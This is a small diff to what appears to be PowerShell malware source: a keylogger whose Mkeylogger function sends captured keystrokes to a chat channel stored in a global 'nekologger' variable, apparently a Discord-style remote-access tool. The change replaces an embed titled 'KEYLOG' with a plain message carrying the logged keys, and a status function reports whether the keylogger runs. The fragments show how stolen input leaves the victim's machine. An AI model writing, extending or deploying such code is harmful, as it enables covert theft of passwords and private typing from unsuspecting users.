@@ -130,7 +130,7 @@ function Mkeylogger {
                 }
                 
                 try {
-                    sendEmbedWithImage -Title "KEYLOG" -Description $logContent -ChannelTarget $global:process_nekologger_channel_name
+                    sendMsg -Message $logContent -ChannelTarget $global:process_nekologger_channel_name
                 } catch {}
             }
 
@@ -235,3 +235,4 @@ function MGet_KeyloggerStatus {
         sendEmbedWithImage -Title "KEYLOGGER STATUS" -Description ":gear: **Keylogger Status:** Stopped" -ChannelTarget $global:process_nekologger_channel_name
     }
 }
+
